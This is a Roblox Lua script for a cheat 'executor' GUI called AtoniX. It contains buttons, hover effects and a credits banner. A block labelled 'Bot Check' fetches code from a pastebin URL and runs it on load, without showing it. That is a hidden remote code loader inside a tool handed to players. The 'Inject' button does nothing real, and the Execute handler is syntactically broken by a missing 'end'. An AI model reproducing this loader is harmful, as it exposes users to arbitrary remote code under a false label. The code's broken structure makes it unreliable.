--[Please Give Credits For Our Hard Work In This Script]

local AtoniXExecutor = Instance.new("ScreenGui")
local AtonixMainFrameMeow = Instance.new("Frame")
local OtherFrames = Instance.new("Folder")
local Settings = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local skull = Instance.new("TextLabel")
local Options = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIGridLayout = Instance.new("UIGridLayout")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local SET = Instance.new("ImageButton")
local BUG = Instance.new("ImageButton")
local Main = Instance.new("Folder")
local TextBox = Instance.new("TextBox")
local UICorner_8 = Instance.new("UICorner")
local EXE = Instance.new("TextButton")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local UICorner_9 = Instance.new("UICorner")
local CLE = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local CLO = Instance.new("ImageButton")
local UICorner_11 = Instance.new("UICorner")
local MIN = Instance.new("ImageButton")
local UICorner_12 = Instance.new("UICorner")
local INJ = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local UICorner_14 = Instance.new("UICorner")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
local TopTitle = Instance.new("Folder")
local A = Instance.new("TextLabel")
local TONI = Instance.new("TextLabel")
local X = Instance.new("TextLabel")
local Logo = Instance.new("ImageLabel")
local UICorner_15 = Instance.new("UICorner")

--Properties:

AtoniXExecutor.Name = "AtoniX Executor"
AtoniXExecutor.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
AtoniXExecutor.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

AtonixMainFrameMeow.Name = "AtonixMainFrameMeow"
AtonixMainFrameMeow.Parent = AtoniXExecutor
AtonixMainFrameMeow.BackgroundColor3 = Color3.fromRGB(22, 0, 0)
AtonixMainFrameMeow.BackgroundTransparency = 0.070
AtonixMainFrameMeow.BorderColor3 = Color3.fromRGB(0, 0, 0)
AtonixMainFrameMeow.BorderSizePixel = 0
AtonixMainFrameMeow.Position = UDim2.new(0.5, -250, 0.5, -150)
AtonixMainFrameMeow.Size = UDim2.new(0, 500, 0, 300)

OtherFrames.Name = "OtherFrames"
OtherFrames.Parent = AtonixMainFrameMeow

Settings.Name = "Settings"
Settings.Parent = OtherFrames
Settings.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Settings.BackgroundTransparency = 0.040
Settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(-0.180000007, 0, 0, 0)
Settings.Size = UDim2.new(0, 199, 0, 276)
Settings.Visible = false
Settings.ZIndex = 9

UICorner.CornerRadius = UDim.new(0, 11)
UICorner.Parent = Settings

Title.Name = "Title"
Title.Parent = Settings
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.180904523, 0, 0.0181159414, 0)
Title.Size = UDim2.new(0, 127, 0, 31)
Title.Font = Enum.Font.SourceSans
Title.Text = "Settings"
Title.TextColor3 = Color3.fromRGB(163, 163, 163)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

skull.Name = ":skull:"
skull.Parent = Title
skull.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
skull.BackgroundTransparency = 1.000
skull.BorderColor3 = Color3.fromRGB(0, 0, 0)
skull.BorderSizePixel = 0
skull.Position = UDim2.new(-0.283464581, 0, 0.129032254, 0)
skull.Size = UDim2.new(0, 200, 0, 50)
skull.Font = Enum.Font.SourceSans
skull.Text = "_________________________________"
skull.TextColor3 = Color3.fromRGB(141, 141, 141)
skull.TextSize = 14.000

Options.Name = "Options"
Options.Parent = Settings
Options.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Options.BackgroundTransparency = 1.000
Options.BorderColor3 = Color3.fromRGB(0, 0, 0)
Options.BorderSizePixel = 0
Options.Position = UDim2.new(0.0452261306, 0, 0.166666672, 0)
Options.Size = UDim2.new(0, 182, 0, 198)

UICorner_2.CornerRadius = UDim.new(0, 11)
UICorner_2.Parent = Options

UIGridLayout.Parent = Options
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 164, 0, 35)

TextButton.Parent = Options
TextButton.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
TextButton.BackgroundTransparency = 0.800
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0989011005, 0, 0.00505050505, 0)
TextButton.Size = UDim2.new(0, 164, 0, 35)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Auto Inject"
TextButton.TextColor3 = Color3.fromRGB(213, 213, 213)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = TextButton

TextButton_2.Parent = Options
TextButton_2.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
TextButton_2.BackgroundTransparency = 0.800
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.0989011005, 0, 0.00505050505, 0)
TextButton_2.Size = UDim2.new(0, 164, 0, 35)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Multi Attach (Soon)"
TextButton_2.TextColor3 = Color3.fromRGB(213, 213, 213)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = TextButton_2

TextButton_3.Parent = Options
TextButton_3.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
TextButton_3.BackgroundTransparency = 0.800
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.0989011005, 0, 0.00505050505, 0)
TextButton_3.Size = UDim2.new(0, 164, 0, 35)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "M3OW"
TextButton_3.TextColor3 = Color3.fromRGB(213, 213, 213)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

UICorner_5.CornerRadius = UDim.new(0, 4)
UICorner_5.Parent = TextButton_3

TextButton_4.Parent = Options
TextButton_4.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
TextButton_4.BackgroundTransparency = 0.800
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0989011005, 0, 0.00505050505, 0)
TextButton_4.Size = UDim2.new(0, 164, 0, 35)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "M3OW"
TextButton_4.TextColor3 = Color3.fromRGB(213, 213, 213)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true

UICorner_6.CornerRadius = UDim.new(0, 4)
UICorner_6.Parent = TextButton_4

TextButton_5.Parent = Options
TextButton_5.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
TextButton_5.BackgroundTransparency = 0.800
TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Position = UDim2.new(0.0989011005, 0, 0.00505050505, 0)
TextButton_5.Size = UDim2.new(0, 164, 0, 35)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "M3OW"
TextButton_5.TextColor3 = Color3.fromRGB(213, 213, 213)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true

UICorner_7.CornerRadius = UDim.new(0, 4)
UICorner_7.Parent = TextButton_5

SET.Name = "SET"
SET.Parent = OtherFrames
SET.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SET.BackgroundTransparency = 1.000
SET.BorderColor3 = Color3.fromRGB(0, 0, 0)
SET.BorderSizePixel = 0
SET.Position = UDim2.new(0.782000005, 0, 0, 0)
SET.Size = UDim2.new(0, 19, 0, 19)
SET.Image = "http://www.roblox.com/asset/?id=14134158045"

BUG.Name = "BUG"
BUG.Parent = OtherFrames
BUG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BUG.BackgroundTransparency = 1.000
BUG.BorderColor3 = Color3.fromRGB(0, 0, 0)
BUG.BorderSizePixel = 0
BUG.Position = UDim2.new(0.836000025, 0, 0, 0)
BUG.Size = UDim2.new(0, 19, 0, 19)
BUG.Image = "http://www.roblox.com/asset/?id=10165650767"

Main.Name = "Main"
Main.Parent = AtonixMainFrameMeow

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(52, 0, 0)
TextBox.BackgroundTransparency = 0.100
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0480000004, 0, 0.196666673, 0)
TextBox.Size = UDim2.new(0.90200001, 0, 0.603333354, 0)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.SourceSans
TextBox.MultiLine = true
TextBox.PlaceholderColor3 = Color3.fromRGB(139, 0, 0)
TextBox.PlaceholderText = "print (\"Hello From Atonix!\")"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(175, 0, 0)
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

UICorner_8.CornerRadius = UDim.new(0, 5)
UICorner_8.Parent = TextBox

EXE.Name = "EXE"
EXE.Parent = Main
EXE.BackgroundColor3 = Color3.fromRGB(98, 0, 0)
EXE.BackgroundTransparency = 0.600
EXE.BorderColor3 = Color3.fromRGB(0, 0, 0)
EXE.BorderSizePixel = 0
EXE.Position = UDim2.new(0.128000006, -50, 1.04333329, -60)
EXE.Size = UDim2.new(0.189999998, 0, 0.123333335, 0)
EXE.Font = Enum.Font.SourceSansBold
EXE.Text = "Execute"
EXE.TextColor3 = Color3.fromRGB(0, 0, 0)
EXE.TextSize = 25.000
EXE.TextWrapped = true

UIAspectRatioConstraint.Parent = EXE
UIAspectRatioConstraint.AspectRatio = 2.568

UICorner_9.CornerRadius = UDim.new(0, 6)
UICorner_9.Parent = EXE

CLE.Name = "CLE"
CLE.Parent = Main
CLE.BackgroundColor3 = Color3.fromRGB(98, 0, 0)
CLE.BackgroundTransparency = 0.600
CLE.BorderColor3 = Color3.fromRGB(0, 0, 0)
CLE.BorderSizePixel = 0
CLE.Position = UDim2.new(0.342000008, -50, 1.04333329, -60)
CLE.Size = UDim2.new(0.189999998, 0, 0.123333335, 0)
CLE.Font = Enum.Font.SourceSansBold
CLE.Text = "Clear"
CLE.TextColor3 = Color3.fromRGB(0, 0, 0)
CLE.TextSize = 25.000
CLE.TextWrapped = true

UICorner_10.CornerRadius = UDim.new(0, 6)
UICorner_10.Parent = CLE

UIAspectRatioConstraint_2.Parent = CLE
UIAspectRatioConstraint_2.AspectRatio = 2.568

CLO.Name = "CLO"
CLO.Parent = Main
CLO.BackgroundColor3 = Color3.fromRGB(191, 0, 0)
CLO.BackgroundTransparency = 1.000
CLO.BorderColor3 = Color3.fromRGB(0, 0, 0)
CLO.BorderSizePixel = 0
CLO.Position = UDim2.new(0.94599998, 0, 0, 0)
CLO.Size = UDim2.new(0, 21, 0, 20)
CLO.Image = "http://www.roblox.com/asset/?id=132261474823036"

UICorner_11.CornerRadius = UDim.new(0, 5)
UICorner_11.Parent = CLO

MIN.Name = "MIN"
MIN.Parent = Main
MIN.BackgroundColor3 = Color3.fromRGB(191, 0, 0)
MIN.BackgroundTransparency = 1.000
MIN.BorderColor3 = Color3.fromRGB(0, 0, 0)
MIN.BorderSizePixel = 0
MIN.Position = UDim2.new(0.899999976, 0, 0, 0)
MIN.Size = UDim2.new(0, 16, 0, 20)
MIN.Image = "http://www.roblox.com/asset/?id=15396333997"

UICorner_12.CornerRadius = UDim.new(0, 5)
UICorner_12.Parent = MIN

INJ.Name = "INJ"
INJ.Parent = Main
INJ.BackgroundColor3 = Color3.fromRGB(98, 0, 0)
INJ.BackgroundTransparency = 0.600
INJ.BorderColor3 = Color3.fromRGB(0, 0, 0)
INJ.BorderSizePixel = 0
INJ.Position = UDim2.new(0.860000014, -50, 1.04333329, -60)
INJ.Size = UDim2.new(0.189999998, 0, 0.123333335, 0)
INJ.Font = Enum.Font.SourceSansBold
INJ.Text = "Inject"
INJ.TextColor3 = Color3.fromRGB(0, 0, 0)
INJ.TextSize = 25.000
INJ.TextWrapped = true

UICorner_13.CornerRadius = UDim.new(0, 6)
UICorner_13.Parent = INJ

UIAspectRatioConstraint_3.Parent = INJ
UIAspectRatioConstraint_3.AspectRatio = 2.568

UICorner_14.Parent = AtonixMainFrameMeow

UIAspectRatioConstraint_4.Parent = AtonixMainFrameMeow
UIAspectRatioConstraint_4.AspectRatio = 1.667

TopTitle.Name = "TopTitle"
TopTitle.Parent = AtonixMainFrameMeow

A.Name = "A"
A.Parent = TopTitle
A.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
A.BackgroundTransparency = 1.000
A.BorderColor3 = Color3.fromRGB(0, 0, 0)
A.BorderSizePixel = 0
A.Position = UDim2.new(-0.0900000036, 0, -0.0133333337, 0)
A.Size = UDim2.new(0.400000006, 0, 0.166666672, 0)
A.Font = Enum.Font.SourceSansBold
A.Text = "A"
A.TextColor3 = Color3.fromRGB(173, 2, 1)
A.TextScaled = true
A.TextSize = 14.000
A.TextWrapped = true

TONI.Name = "TONI"
TONI.Parent = TopTitle
TONI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TONI.BackgroundTransparency = 1.000
TONI.BorderColor3 = Color3.fromRGB(0, 0, 0)
TONI.BorderSizePixel = 0
TONI.Position = UDim2.new(0.00999999978, 0, -0.00999999978, 0)
TONI.Size = UDim2.new(0.400000006, 0, 0.166666672, 0)
TONI.Font = Enum.Font.SourceSansBold
TONI.Text = "TONI"
TONI.TextColor3 = Color3.fromRGB(0, 0, 0)
TONI.TextScaled = true
TONI.TextSize = 14.000
TONI.TextWrapped = true

X.Name = "X"
X.Parent = TopTitle
X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
X.BackgroundTransparency = 1.000
X.BorderColor3 = Color3.fromRGB(0, 0, 0)
X.BorderSizePixel = 0
X.Position = UDim2.new(0.119999997, 0, -0.00999999978, 0)
X.Size = UDim2.new(0.400000006, 0, 0.166666672, 0)
X.Font = Enum.Font.SourceSansBold
X.Text = "X"
X.TextColor3 = Color3.fromRGB(173, 2, 1)
X.TextScaled = true
X.TextSize = 14.000
X.TextWrapped = true

Logo.Name = "Logo"
Logo.Parent = TopTitle
Logo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Logo.BackgroundTransparency = 0.650
Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0, 0, 0.00333333341, 0)
Logo.Size = UDim2.new(0.0799999982, 0, 0.13666667, 0)
Logo.Image = "http://www.roblox.com/asset/?id=75370593852406"

UICorner_15.Parent = Logo

-- Scripts:

local function HPESFXJ_fake_script() -- Settings.Dragging.dll 
	local script = Instance.new('LocalScript', Settings)

	script.Parent.Draggable = true
	script.Parent.Active = true
end
coroutine.wrap(HPESFXJ_fake_script)()
local function KPFNT_fake_script() -- SET.Open.dll 
	local script = Instance.new('LocalScript', SET)

	local Settings = script.Parent.Parent.Settings
	
	script.Parent.MouseButton1Click:Connect(function()
		Settings.Visible = not Settings.Visible
	end)
end
coroutine.wrap(KPFNT_fake_script)()
local function CAZFI_fake_script() -- BUG.Report.dll 
	local script = Instance.new('LocalScript', BUG)

	script.Parent.MouseButton1Click:Connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Join Discord To Report Bugs!";
			Text = ".gg/8h5hWYcJBx";
			Duration = 12.5;
		})
	end)
end
coroutine.wrap(CAZFI_fake_script)()
local function HLVMF_fake_script() -- EXE.Tweener.dll 
	local script = Instance.new('LocalScript', EXE)

	local ts = game:GetService("TweenService")
	local btn = script.Parent
	
	local tween = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local inHover = {BackgroundTransparency = 0.4}
	local outHover = {BackgroundTransparency = 0.7}
	
	local inTween = ts:Create(btn, tween, inHover)
	local outTween = ts:Create(btn, tween, outHover)
	
	btn.MouseEnter:Connect(function()
		inTween:Play()
	end)
	
	btn.MouseLeave:Connect(function()
		outTween:Play()
	end)
end
coroutine.wrap(HLVMF_fake_script)()
local function QARHEBK_fake_script() -- EXE.Execute.dll 
	local script = Instance.new('LocalScript', EXE)

	local button = script.Parent
	local textBox = button.Parent:FindFirstChild("TextBox")
	
	if not textBox or not textBox:IsA("TextBox") then
		warn("[Error] TextBox not found. Ensure it is correctly set up!")
		return
	end
	
	--[Execute Process]
	local function executeCode()
		local inputCode = textBox.Text:match("^%s*(.-)%s*$")
	
		if inputCode == "" then
			warn("[Warning] No code entered.")
			return
		end
	
		local func, err = loadstring(inputCode)
	
		if not func then
			warn("[Syntax Error] " .. tostring(err))
			return
		end
	
		local env = {
			print = print,
			warn = warn,
			tonumber = tonumber,
			tostring = tostring,
			require = require,
			game = game,
			workspace = workspace,
			script = script,
		}
	
		local success, result = pcall(function()
			setfenv(func, env)
			return func()
		end)
	
		if not success then
			warn("[Execution Error] " .. tostring(result))
		end
	
	--[Execute When Clicked]
	button.MouseButton1Click:Connect(executeCode)
end
coroutine.wrap(QARHEBK_fake_script)()
local function AKRQ_fake_script() -- EXE.Colors.dll 
	local script = Instance.new('LocalScript', EXE)

	local button = script.Parent
	
	--[Colors]
	local normalColor = Color3.fromRGB(98, 0, 0)
	local hoveredColor = Color3.fromRGB(194, 0, 0)
	
	button.BackgroundColor3 = normalColor
	
	--[hoveredColor]
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = hoveredColor
	end)
	
	--[normalColor]
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = normalColor
	end)
end
coroutine.wrap(AKRQ_fake_script)()
local function QVCTZ_fake_script() -- CLE.Clear.dll 
	local script = Instance.new('LocalScript', CLE)

	local button = script.Parent
	local textBox = button.Parent:FindFirstChild("TextBox")
	
	if not textBox or not textBox:IsA("TextBox") then
		warn("TextBox not found in Parent. Make sure it's correctly set up!")
		return
	end
	
	local function clearText()
		textBox.Text = ""
	end
	
	button.MouseButton1Click:Connect(clearText)
end
coroutine.wrap(QVCTZ_fake_script)()
local function PHSBXY_fake_script() -- CLE.Colors.dll 
	local script = Instance.new('LocalScript', CLE)

	local button = script.Parent
	
	--[Colors]
	local normalColor = Color3.fromRGB(98, 0, 0)
	local hoveredColor = Color3.fromRGB(194, 0, 0)
	
	button.BackgroundColor3 = normalColor
	
	--[hoveredColor]
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = hoveredColor
	end)
	
	--[normalColor]
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = normalColor
	end)
end
coroutine.wrap(PHSBXY_fake_script)()
local function ERXF_fake_script() -- CLE.Tweener.dll 
	local script = Instance.new('LocalScript', CLE)

	local ts = game:GetService("TweenService")
	local btn = script.Parent
	
	local tween = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local inHover = {BackgroundTransparency = 0.4}
	local outHover = {BackgroundTransparency = 0.7}
	
	local inTween = ts:Create(btn, tween, inHover)
	local outTween = ts:Create(btn, tween, outHover)
	
	btn.MouseEnter:Connect(function()
		inTween:Play()
	end)
	
	btn.MouseLeave:Connect(function()
		outTween:Play()
	end)
end
coroutine.wrap(ERXF_fake_script)()
local function UBAZW_fake_script() -- CLO.Close.dll 
	local script = Instance.new('LocalScript', CLO)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Visible = false 
	end)
end
coroutine.wrap(UBAZW_fake_script)()
local function CUGUJHS_fake_script() -- CLO.Tweener.dll 
	local script = Instance.new('LocalScript', CLO)

	local ts = game:GetService("TweenService")
	local btn = script.Parent
	
	local tween = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local inHover = {BackgroundTransparency = 0.65}
	local outHover = {BackgroundTransparency = 1}
	
	local inTween = ts:Create(btn, tween, inHover)
	local outTween = ts:Create(btn, tween, outHover)
	
	btn.MouseEnter:Connect(function()
		inTween:Play()
	end)
	
	btn.MouseLeave:Connect(function()
		outTween:Play()
	end)
end
coroutine.wrap(CUGUJHS_fake_script)()
local function EWNZC_fake_script() -- MIN.Minimize.dll 
	local script = Instance.new('LocalScript', MIN)

	script.Parent.MouseButton1Click:Connect(function()
			script.Parent.Parent.Parent.Visible = false 
		end)
end
coroutine.wrap(EWNZC_fake_script)()
local function DKNF_fake_script() -- MIN.Tweener.dll 
	local script = Instance.new('LocalScript', MIN)

	local ts = game:GetService("TweenService")
	local btn = script.Parent
	
	local tween = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local inHover = {BackgroundTransparency = 0.65}
	local outHover = {BackgroundTransparency = 1}
	
	local inTween = ts:Create(btn, tween, inHover)
	local outTween = ts:Create(btn, tween, outHover)
	
	btn.MouseEnter:Connect(function()
		inTween:Play()
	end)
	
	btn.MouseLeave:Connect(function()
		outTween:Play()
	end)
end
coroutine.wrap(DKNF_fake_script)()
local function YHLTAW_fake_script() -- INJ.Inject.dll 
	local script = Instance.new('LocalScript', INJ)

	local button = script.Parent
	local player = game.Players.LocalPlayer
	
	--[Bot Check]
	local isBot = loadstring(game:HttpGet("https://pastebin.com/raw/yB2QxDwu", true))()
	
	--[System]
	button.MouseButton1Click:Connect(function()
	    if isBot then
	        warn("Bot detected! Action not allowed.")
	    else
	        print("Player Connected:", player.Name)
	    end
	end)
	
end
coroutine.wrap(YHLTAW_fake_script)()
local function PNFXJ_fake_script() -- INJ.Color.dll 
	local script = Instance.new('LocalScript', INJ)

	local button = script.Parent
	
	--[Colors]
	local normalColor = Color3.fromRGB(98, 0, 0)
	local hoveredColor = Color3.fromRGB(194, 0, 0)
	
	button.BackgroundColor3 = normalColor
	
	--[hoveredColor]
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = hoveredColor
	end)
	
	--[normalColor]
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = normalColor
	end)
end
coroutine.wrap(PNFXJ_fake_script)()
local function SSUUSNY_fake_script() -- INJ.Tweener.dll 
	local script = Instance.new('LocalScript', INJ)

	local ts = game:GetService("TweenService")
	local btn = script.Parent
	
	local tween = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local inHover = {BackgroundTransparency = 0.4}
	local outHover = {BackgroundTransparency = 0.7}
	
	local inTween = ts:Create(btn, tween, inHover)
	local outTween = ts:Create(btn, tween, outHover)
	
	btn.MouseEnter:Connect(function()
		inTween:Play()
	end)
	
	btn.MouseLeave:Connect(function()
		outTween:Play()
	end)
end
coroutine.wrap(SSUUSNY_fake_script)()
local function DXYFP_fake_script() -- Logo.Tweener..dll 
	local script = Instance.new('LocalScript', Logo)

	local ts = game:GetService("TweenService")
	local btn = script.Parent
	
	local tween = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local inHover = {BackgroundTransparency = 0.32}
	local outHover = {BackgroundTransparency = 0.65}
	
	local inTween = ts:Create(btn, tween, inHover)
	local outTween = ts:Create(btn, tween, outHover)
	
	btn.MouseEnter:Connect(function()
		inTween:Play()
	end)
	
	btn.MouseLeave:Connect(function()
		outTween:Play()
	end)
end
coroutine.wrap(DXYFP_fake_script)()
local function LBJCN_fake_script() -- AtonixMainFrameMeow.Dragging.dll 
	local script = Instance.new('LocalScript', AtonixMainFrameMeow)

	script.Parent.Draggable = true
	script.Parent.Active = true
end
coroutine.wrap(LBJCN_fake_script)()
local function LZDTG_fake_script() -- AtoniXExecutor.Credits.txt 
	local script = Instance.new('LocalScript', AtoniXExecutor)

	print ("Hello, From AtoniX!")
	
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	
	
	  Credits: loafmoonlua / M3OW M1X, ruffnecksouljah / Soulzay, loadlibv1 / C++, bob_jr9 / Justahoy,etc
	  
	  
	 NOTE: 
	 If you choose to use or incorporate any part of our code,
	 including our DLL files or source code,
	 we kindly ask that you provide proper credit to our team for the time,
	 effort,
	 and dedication we have put into developing it.
	 Acknowledging our work not only respects our contributions but also upholds ethical standards within the development community.
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
